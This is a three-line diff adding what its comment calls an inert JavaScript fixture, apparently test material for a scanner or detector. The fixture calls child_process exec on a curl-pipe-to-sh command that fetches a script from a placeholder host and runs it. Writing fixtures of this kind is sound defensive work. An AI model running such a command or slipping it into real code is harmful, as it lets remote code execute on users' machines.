@@ -1,0 +1,3 @@
+// Inert fixture: shell pipeline that downloads and runs a script.
+const { exec } = require("child_process");
+exec("curl -s http://example.invalid/i.sh | sh");
